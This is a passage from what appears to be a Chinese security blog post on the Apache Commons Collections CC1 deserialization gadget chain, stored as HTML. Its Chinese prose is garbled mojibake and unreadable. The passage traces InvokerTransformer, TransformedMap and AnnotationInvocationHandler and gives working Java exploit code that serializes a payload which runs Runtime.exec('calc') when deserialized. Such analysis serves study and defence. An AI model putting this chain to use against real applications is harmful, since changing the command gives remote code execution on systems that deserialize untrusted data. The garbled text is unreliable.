CommonsCollectionsè‡ªå®šä¹‰çš„ä¸€ç»„å…¬ç”¨çš„æ¥å£å’Œå·¥å…·ç±»</p></li><li><p><code>org.apache.commons.collections.bag</code> â€“ å®ç°Bagæ¥å£çš„ä¸€ç»„ç±»</p></li><li><p><code>org.apache.commons.collections.bidimap</code> â€“ å®ç°BidiMapç³»åˆ—æ¥å£çš„ä¸€ç»„ç±»</p></li><li><p><code>org.apache.commons.collections.buffer</code> â€“ å®ç°Bufferæ¥å£çš„ä¸€ç»„ç±»</p></li><li><p><code>org.apache.commons.collections.collection</code> â€“å®ç°java.util.Collectionæ¥å£çš„ä¸€ç»„ç±»</p></li><li><p><code>org.apache.commons.collections.comparators</code>â€“ å®ç°java.util.Comparatoræ¥å£çš„ä¸€ç»„ç±»</p></li><li><p><code>org.apache.commons.collections.functors</code> â€“Commons Collectionsè‡ªå®šä¹‰çš„ä¸€ç»„åŠŸèƒ½ç±»</p></li><li><p><code>org.apache.commons.collections.iterators</code> â€“ å®ç°java.util.Iteratoræ¥å£çš„ä¸€ç»„ç±»</p></li><li><p><code>org.apache.commons.collections.keyvalue</code> â€“ å®ç°é›†åˆå’Œé”®&#x2F;å€¼æ˜ å°„ç›¸å…³çš„ä¸€ç»„ç±»</p></li><li><p><code>org.apache.commons.collections.list</code> â€“ å®ç°java.util.Listæ¥å£çš„ä¸€ç»„ç±»</p></li><li><p><code>org.apache.commons.collections.map</code> â€“ å®ç°Mapç³»åˆ—æ¥å£çš„ä¸€ç»„ç±»</p></li><li><p><code>org.apache.commons.collections.set</code> â€“ å®ç°Setç³»åˆ—æ¥å£çš„ä¸€ç»„ç±»</p></li></ul><h2 id="æ”»å‡»é“¾åˆ†æ"><a href="#æ”»å‡»é“¾åˆ†æ" class="headerlink" title="æ”»å‡»é“¾åˆ†æ"></a>æ”»å‡»é“¾åˆ†æ</h2><h3 id="å¯»æ‰¾å°¾éƒ¨"><a href="#å¯»æ‰¾å°¾éƒ¨" class="headerlink" title="å¯»æ‰¾å°¾éƒ¨"></a>å¯»æ‰¾å°¾éƒ¨</h3><p>é€šè¿‡<a href="https://github.com/frohoff/ysoserial">ysoserial</a>å¯ä»¥çœ‹åˆ°å±é™©æ–¹æ³•æ˜¯<code>InvokerTransformer . transform()</code>æ–¹æ³•</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240521163436805.png" alt="image-20240521163436805"></p><p>æˆ‘ä»¬è¯•ç€ç”¨æ¼æ´å‘ç°ä½œè€…çš„è§†è§’æ¥è°ƒè¯•ä»£ç ï¼Œä½œè€…é¦–å…ˆæ‰¾åˆ°äº†<code>Transformer</code>æ¥å£ï¼Œæ¥å£æœ‰<code>transform()</code>æ–¹æ³•ã€‚</p><p>æœ‰21ä¸ªå®ç°æ–¹æ³•(åŒ…å«äº†ä¸»è§’å„¿<code>InvokerTransformer</code>)ï¼Œæ‰¾åˆ°çš„<code>InvokerTransformer.transform()</code>æ–¹æ³•</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240521222016548.png" alt="image-20240521222016548"></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240521223049332.png" alt="image-20240521223049332"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;  <span class="hljs-comment">//æ¥å—ä¸€ä¸ªå¯¹è±¡</span><br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();  <span class="hljs-comment">//åå°„</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);  <br>            <span class="hljs-keyword">return</span> method.invoke(input, iArgs);     <span class="hljs-comment">//æ–¹æ³•ï¼Œå‚æ•°ç±»å‹ï¼Œå‚æ•°ï¼Œéƒ½å¯æ§</span><br>                <br>        &#125;<br>    <br></code></pre></td></tr></table></figure><p>è¿™å°±å¯ä»¥ä½œä¸ºæˆ‘ä»¬è¿™æ¡é“¾çš„å°¾éƒ¨ã€‚</p><p>å°è¯•ç”¨è¿™ä¸ªæ–¹æ³•å»å¼¹è®¡ç®—å™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    <span class="hljs-comment">//æ™®é€šå¼¹è®¡ç®—å™¨å†™æ³•</span><br>    Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    <br>    <br>    <span class="hljs-comment">//åå°„å†™æ³•</span><br>    <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>    Class&lt;Runtime&gt; c = Runtime.class;<br>    <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>    exec.invoke(r, <span class="hljs-string">&quot;calc&quot;</span>);<br>    <br>    <span class="hljs-comment">//InvokerTransformer.transformå†™æ³•</span><br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆå†™<code> new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</code></p><p>é¦–å…ˆï¼Œæˆ‘ä»¬ç¡®è®¤<code>InvokerTransformer.transform()</code>å› ä¸ºå‚æ•°å¯æ§ï¼Œå¯ä»¥è°ƒç”¨ä»»æ„æ–¹æ³•ã€‚<code>transform()</code>éœ€è¦ä¼ å…¥çš„æ˜¯ä¸€ä¸ªå¯¹è±¡,æ‰€ä»¥ä¼ å…¥å¯¹è±¡Runtimeå¯¹è±¡ï¼›</p><p>æ¥ä¸‹æ¥çœ‹InvokerTransformerçš„æ„é€ æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ–¹æ³•åï¼ˆStringç±»å‹ï¼‰ï¼Œæ‰€ä»¥å¡«å…¥â€execâ€ï¼›</p><p>ç¬¬äºŒä¸ªå‚æ•°ï¼Œå‚æ•°ç±»å‹ï¼ˆClassæ•°ç»„ï¼‰ï¼Œâ€execâ€æ¥å—ä¸€ä¸ª <code>String</code> ç±»å‹æ‰€ä»¥å¡«å…¥new Class[]{String.class}ï¼›</p><p>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå‚æ•°å€¼ï¼ˆObjectæ•°ç»„ï¼‰ï¼Œæ‰€ä»¥å¡«å…¥new Object[]{â€œcalcâ€})ï¼›</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240521225147161.png" alt="image-20240521225147161"></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240521225202458.png" alt="image-20240521225202458"></p><p>ä¸‹ä¸€æ­¥çš„ç›®æ ‡æ˜¯å»æ‰¾è°ƒç”¨ <code>transform()</code> æ–¹æ³•çš„ä¸åŒç±»ã€‚</p><h3 id="å¯»æ‰¾è°ƒç”¨é“¾"><a href="#å¯»æ‰¾è°ƒç”¨é“¾" class="headerlink" title="å¯»æ‰¾è°ƒç”¨é“¾"></a>å¯»æ‰¾è°ƒç”¨é“¾</h3><p>æŒ‰ä½alt+f7å¯»æ‰¾å“ªäº›å‡½æ•°è°ƒç”¨äº†ï¼Œ<code>transform()</code>æ–¹æ³•,çœ‹åˆ°æœ‰21ä¸ªè°ƒç”¨<img src="https://image.sp4rks.xyz/2024/06/image-20240522210518321.png" alt="image-20240522210518321"></p><p>æˆ‘ä»¬ç›®æ ‡æ˜¯æ‰¾åˆ°ä¸€ä¸ªä¸åŒåæ–¹æ³•è°ƒç”¨äº†<code>transform()</code>æ–¹æ³•ï¼Œç›¸å½“ä¸è®©è°ƒç”¨é“¾å¾€å‰èµ°ä¸€æ­¥ï¼Œæœ€ç»ˆæˆ‘ä»¬å‘¢æ‰¾åˆ°äº†<code>TransformdMap. checkSetValue()</code>è°ƒç”¨äº†<code>transform()</code><img src="https://image.sp4rks.xyz/2024/06/image-20240522211955793.png" alt="image-20240522211955793"></p><p>å•ç‹¬æŠŠè¿™å‡ æ®µä»£ç æ”¾å‡ºæ¥è§£é‡Šä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//TransformedMapç»§æ‰¿äº†AbstractInputCheckedMapDecorator å¹¶å®ç°äº† Serializable æ¥å£</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformedMap</span>   <br>        <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractInputCheckedMapDecorator</span><br>        <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <br><span class="hljs-comment">//keyTransformer å’Œ valueTransformer çš„ç±»å‹æ˜¯Transformerï¼Œè¿™è¡¨æ˜å®ƒä»¬æ˜¯å¯¹è±¡ï¼Œè€Œä¸æ˜¯åŸºæœ¬æ•°æ®ç±»å‹æˆ–å±€éƒ¨å˜é‡ã€‚</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">7023152376788900464L</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer keyTransformer;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer valueTransformer;  <br>    <br><br><span class="hljs-comment">//decorate æ–¹æ³•æ˜¯ä¸€ä¸ªé™æ€å·¥å‚æ–¹æ³•ï¼Œæ¥å—ä¸€ä¸ªMapå’Œä¸¤ä¸ªTransformerå¯¹è±¡ï¼Œè¿”å›ä¸€ä¸ªç»è¿‡è½¬æ¢çš„Mapã€‚</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>    &#125; <br><br><span class="hljs-comment">// æ„é€ å‡½æ•°æ¥å—ä¸€ä¸ªMapå’Œä¸¤ä¸ªTransformerå¯¹è±¡ï¼Œå¹¶è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°super(map)æ¥åˆå§‹åŒ–åŸºç±»éƒ¨åˆ†ï¼ŒåŒæ—¶åˆå§‹åŒ– keyTransformer å’Œ valueTransformer æˆå‘˜å˜é‡ã€‚</span><br>  <span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-built_in">this</span>.keyTransformer = keyTransformer;<br>        <span class="hljs-built_in">this</span>.valueTransformer = valueTransformer;<br>    &#125;   <br>    <br><span class="hljs-comment">//checkSetValue æ–¹æ³•ç”¨äºåœ¨è®¾ç½®å€¼æ—¶å¯¹å€¼è¿›è¡Œè½¬æ¢ã€‚å®ƒé€šè¿‡è°ƒç”¨ valueTransformer çš„ transform æ–¹æ³•å°†ä¼ å…¥çš„å€¼è½¬æ¢æˆç›®æ ‡å€¼ã€‚</span><br><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> &#123;<br>        <span class="hljs-keyword">return</span> valueTransformer.transform(value);<br>    &#125;       <br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">æˆ‘ä»¬çœ‹åˆ°è¿”å›äº†ä¸€ä¸ªvalueTransformer.transform(value),é‚£valueTransformeræ˜¯ä»€ä¹ˆï¼Ÿ(Ctrl+é¼ æ ‡å·¦é”®ç‚¹å‡»valueTransformer)åˆ°äº†æ„é€ å‡½æ•°ï¼Œæ„é€ å‡½æ•°æ˜¯ä¸€ä¸ªprotected,è¯´æ˜åªèƒ½è‡ªå·±è°ƒç”¨<br>    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;<br>        super(map);<br>        this.keyTransformer = keyTransformer;<br>        this.valueTransformer = valueTransformer;<br>    &#125;<br>æœ€åçœ‹åˆ°decorateæ–¹æ³•å®Œæˆäº†è£…é¥°æ“ä½œ<br>      public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;<br>        return new TransformedMap(map, keyTransformer, valueTransformer);<br>    &#125; <br><br></code></pre></td></tr></table></figure><p>å› ä¸ºdecorateæ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•æ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨<code>TransformedMap.decorate</code>;</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523095834788.png" alt="image-20240523095834788"></p><p>æ¥ä¸‹æ¥å°±æ‰¾è°è°ƒç”¨äº†<code>checkSetValue()</code>,å‘ç°å°±ä¸€ä¸ªè°ƒç”¨ï¼Œ<code>AbstractInputCheckedMapDecorator.MapEntry.setValue()</code>ã€‚æ˜¯<code>TransformedMap</code>çš„çˆ¶ç±»ï¼Œå‘ç°å…¶å®<code>AbstractInputCheckedMapDecorator.setValue()</code>æ˜¯é‡å†™äº†Entryéå†çš„å†™æ³•ã€‚é‚£åªè¦æœ‰ä¸€ä¸ªç±»éå†Entryå°±å¯ä»¥èµ°è¿›<code>setValue</code>ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240522222342135.png" alt="image-20240522222342135"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        <br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <br>        map.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        <br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br>        <br>        <span class="hljs-keyword">for</span> (Map.Entry entry : transformedMap.entrySet()) &#123;<br>            entry.setValue(r);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥è¯•ç€è°ƒè¯•ä¸€äº›è¿™æ®µä»£ç </p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523000545804.png" alt="image-20240523000545804"></p><p>é¦–å…ˆè¿›å…¥åˆ°<code>AbstractInputCheckedMapDecorator.MapEntry.setValue()</code>ï¼Œparentä¸º<code>TransformedMap</code>å¯¹è±¡ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523090042519.png" alt="image-20240523090042519"></p><p>ç„¶åè¿›å…¥åˆ°<code>TransformedMap.checkSetValue</code>;vulueTransformerä¸º<code>InvokerTransformer</code>å¯¹è±¡</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523000632982.png" alt="image-20240523000632982"></p><p>ç„¶åè¿›å…¥äº†<code>InvokerTransformer.transform</code>;è°ƒç”¨äº†<code>invoke()</code>æ–¹æ³•</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523092438757.png" alt="image-20240523092438757"></p><p>æ‹æ‹è°ƒç”¨é“¾</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523102559433.png" alt="image-20240523102559433"></p><h3 id="é“¾é¦–"><a href="#é“¾é¦–" class="headerlink" title="é“¾é¦–"></a>é“¾é¦–</h3><p>ä¸Šé¢å·²ç»è¯æ˜äº†æˆ‘ä»¬æ‰¾çš„åˆ©ç”¨é“¾æœ‰æ•ˆï¼Œç°åœ¨å†å¾€ä¸Šçº§æ‰¾ï¼Œæ‰¾è°è°ƒç”¨äº†<code>setValue()</code>,æœ€ç»ˆæ‰¾åˆ°äº†<code>AnnotationInvocationHandler.readObject()</code>è°ƒç”¨äº†<code>setValue()</code>ã€‚æ‰€ä»¥å°±å¯ä»¥å½“é“¾é¦–ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523105916973.png" alt="image-20240523105916973"></p><h2 id="TransformMapç‰ˆCC1"><a href="#TransformMapç‰ˆCC1" class="headerlink" title="TransformMapç‰ˆCC1"></a>TransformMapç‰ˆCC1</h2><p>è°ƒç”¨é“¾</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523204418229.png" alt="image-20240523204418229"></p><p>å› ä¸º<code>AnnotationInvocationHandler</code>ä¸æ˜¯publicæ–¹æ³•ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡åå°„åˆ›å»º</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523104354658.png" alt="image-20240523104354658"></p><p>åå°„å†™æ³•æ²¡ä»€ä¹ˆå¥½è¯´çš„ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523151140450.png" alt="image-20240523151140450"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><br>        <br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        <br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br><br><br><span class="hljs-comment">//åå°„è·å–AnnotationInvocationHandler</span><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Override.class, transformedMap);<br><br>        SER(o);<br>        UNSER(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SER</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">UNSER</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ä¸‰ä¸ªé—®é¢˜"><a href="#ä¸‰ä¸ªé—®é¢˜" class="headerlink" title="ä¸‰ä¸ªé—®é¢˜"></a>ä¸‰ä¸ªé—®é¢˜</h3><ol><li><p>Runtimeå¹¶ä¸èƒ½åºåˆ—åŒ–</p></li><li><p>è¿™ä¸ªå¾ªç¯ä½“ä¸çŸ¥é“æ˜¯å¦èƒ½è¿›å»</p></li><li><p><code>AnnotationInvocationHandler.readObject() </code>forå¾ªç¯ä¸­æ˜¯<code>new AnnotationTypeMismatchExceptionProxy</code>å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„Runtimeç±»</p></li></ol><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523152522150.png" alt="image-20240523152522150"></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523151954472.png" alt="image-20240523151954472"></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523151920747.png" alt="image-20240523151920747"></p><h3 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h3><p>è§£å†³é—®é¢˜ä¸€ï¼šè™½ç„¶Runtimeä¸å¯ä»¥åºåˆ—åŒ–ï¼Œä½†æ˜¯Runtime.classå¯ä»¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//é€šè¿‡åå°„è·å–Runtimeå¯¹è±¡</span><br>Class&lt;Runtime&gt; c = Runtime.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">execMethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        execMethod.invoke(r, <span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">     <span class="hljs-comment">//æ ¹æ®InvokerTransformer().transform()ç¼–å†™ï¼Œç›¸å½“äºç”¨è¿™ä¸€ä¸²ä»£ç ï¼Œå®ç°ä¸Šé¢çš„ä»£ç </span><br><span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> (Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;).transform(Runtime.class);<br><br>      <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;).transform(getRuntimeMethod);<br><br>      <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br><br></code></pre></td></tr></table></figure><p>è§£å†³é—®é¢˜äºŒï¼š</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523192532159.png" alt="image-20240523192532159"> </p><p>åˆ†æä¸€ä¸‹è¿™æ®µä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 